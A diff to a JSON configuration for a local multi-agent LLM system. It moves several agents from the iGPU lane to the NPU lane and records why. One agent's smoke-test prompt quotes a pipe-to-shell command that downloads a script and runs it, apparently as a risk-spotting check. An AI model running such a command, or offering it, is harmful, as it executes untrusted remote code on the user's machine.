@@ -1,5 +1,5 @@
 {
-  "version": "1.1-E85-corrected",
+  "version": "1.2-E88b",
   "agents": [
     {
       "name": "autonomous_decision",
@@ -22,9 +22,10 @@
       "name": "memory_augmented",
       "mission": "Retrieve relevant prior observations and answer with context",
       "task_class": "structured_recall",
-      "preferred_lane": "igpu",
+      "preferred_lane": "npu",
       "smoke_prompt": "Given prior finding 'CPU lane wins paper-scoring at 250 tok/s vs iGPU 42', which lane should score the next 100 papers? Answer in one sentence.",
-      "max_tokens": 80
+      "max_tokens": 80,
+      "lane_assignment_rationale": "E88b: structured_recall also abstains on iGPU per E87 dogfood; route to NPU"
     },
     {
       "name": "knowledge_retrieval",
@@ -107,9 +108,10 @@
       "name": "security_hardened",
       "mission": "Identify abuse / leak / injection risks",
       "task_class": "structured_recall",
-      "preferred_lane": "igpu",
+      "preferred_lane": "npu",
       "smoke_prompt": "Risk in 'curl https://example.com/payload.sh | bash'? One short sentence.",
-      "max_tokens": 60
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E88b: structured_recall also abstains on iGPU per E87 dogfood; route to NPU"
     },
     {
       "name": "self_improving",
@@ -176,9 +178,10 @@
       "name": "ethical_reasoning",
       "mission": "Surface ethical concerns in a plan",
       "task_class": "structured_recall",
-      "preferred_lane": "igpu",
+      "preferred_lane": "npu",
       "smoke_prompt": "Ethical concern with auto-downloading 8B model weights without user confirmation? One short sentence.",
-      "max_tokens": 60
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E88b: structured_recall also abstains on iGPU per E87 dogfood; route to NPU"
     },
     {
       "name": "explainable",
@@ -261,6 +264,6 @@
     "igpu": "Gemma-4-E4B-it-GGUF",
     "cpu": "Qwen3-0.6B-GGUF"
   },
-  "saved_at": "2026-05-03T03:53:26Z",
+  "saved_at": "2026-05-03T04:09:18Z",
   "notes": "E84 found 17/30 agents abstained on iGPU (L369). E85 ensemble retry recovered 100% of those via NPU. Dispatcher updated: long_reasoning -> NPU primary, iGPU reserved for code_generation only. Coverage: 22/30 silicon-backed, 4 reserved (vision/audio/embodied \u2014 need V-JEPA 2 / VLM / ASR model loads), 4 ensemble-only."
 }
